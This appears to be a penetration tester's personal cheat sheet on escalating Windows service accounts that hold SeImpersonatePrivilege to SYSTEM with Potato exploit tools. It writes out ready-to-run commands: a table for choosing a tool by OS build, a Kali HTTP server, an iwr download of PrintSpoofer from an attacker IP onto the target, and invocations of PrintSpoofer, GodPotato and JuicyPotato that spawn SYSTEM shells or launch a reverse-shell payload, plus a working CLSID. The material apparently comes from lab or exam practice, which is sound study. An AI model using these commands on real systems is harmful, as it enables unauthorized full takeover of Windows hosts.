# Potato Attacks — SeImpersonate → SYSTEM

**Trigger to look for:** `whoami /priv` shows **`SeImpersonatePrivilege`** OR
**`SeAssignPrimaryTokenPrivilege`** = *Enabled*. Common on IIS / MSSQL service
accounts (`iis apppool\...`, `mssql...`). That one privilege → **SYSTEM**.

**How it works (one line):** the Potato `.exe` tricks a SYSTEM process into
authenticating to a pipe/COM object you control, steals its token, and runs your
command **as SYSTEM**.

> ⚠️ **Start your listener first** if your `-c` runs a reverse shell.

---

## 📁 Where the files live (Kali)

**`/home/nepps1/tools/potatoes/`** — staged, ready to transfer:
`JuicyPotato.exe` · `PrintSpoofer64.exe` / `PrintSpoofer32.exe` ·
`GodPotato-NET4.exe` / `GodPotato-NET35.exe` · `RoguePotato.exe` (+`RogueOxidResolver.exe`)

---

## Which one? Read it straight off `systeminfo`

Look at the **`OS Name`** and **`OS Version`** lines `systeminfo` prints, then match:

| `systeminfo` shows                              | Build             | Use                                                   | Staged file                                 |
| ----------------------------------------------- | ----------------- | ----------------------------------------------------- | ------------------------------------------- |
| Server **2008 / 2012 / 2016**, Win10 **<1809**  | build **< 17763** | **JuicyPotato** (needs a CLSID)                       | `JuicyPotato.exe`                           |
| Server **2019 / 2022**, Win10 **1809+** / Win11 | build **≥ 17763** | **PrintSpoofer** (try 1st) → **GodPotato** (fallback) | `PrintSpoofer64.exe` / `GodPotato-NET4.exe` |

> **The build number is the tiebreaker.** `OS Version: 10.0.17763` → 17763 = the 1809 line = **modern** (PrintSpoofer/GodPotato). Anything below → JuicyPotato.
> **Unsure?** `GodPotato-NET4.exe` is the safe all-rounder for **2012–2022**.
> **32-bit target?** JuicyPotato is x64-only — use `PrintSpoofer32.exe` instead.

---

## Get it onto the target

**Kali** (serve from the potatoes dir):
```bash
cd /home/nepps1/tools/potatoes && python3 -m http.server 80
```
**Target** (pull, from your PS shell):
```powershell
iwr http://192.168.45.233/PrintSpoofer64.exe -o C:\Users\Public\p.exe
```

---

## Run it

**PrintSpoofer** (modern — 2016 / 2019 / 2022; needs Print Spooler running):
```bash
p.exe -i -c cmd                              # interactive SYSTEM shell, and this only works if you are in cmd not powershell.
.\p.exe -c "C:\Users\Public\revshell.exe"      # or fire a reverse shell
```

**GodPotato** (all-rounder 2012–2022; needs .NET — match -NET4 / -NET35):
```cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"                    # confirm = nt authority\system
GodPotato-NET4.exe -cmd "C:\Users\Public\revshell.exe"
```

**JuicyPotato** (old — 2008 / 2012 / 2016; needs a CLSID for the exact OS):
```cmd
JuicyPotato.exe -l 1337 -p C:\Users\Public\revshell.exe -t * -c {CLSID}
```
→ CLSID list: `http://ohpe.it/juicy-potato/CLSID/` (pick one matching the OS).
Generic BITS CLSID: `{4991d34b-80a1-4291-83b6-3328366b9097}`. Error → try another.

> **Confirm every time:** `whoami` → `nt authority\system`.

---

## Related Notes
- [[Windows_Priv_Esc]] — full privesc order of operations (SeImpersonate section)
- [[File_Transfer]] — other transfer methods (certutil / SMB / UNC)
- [[Msfvenom]] — build the `revshell.exe` payload the Potato runs
- [[ReverseShells]]
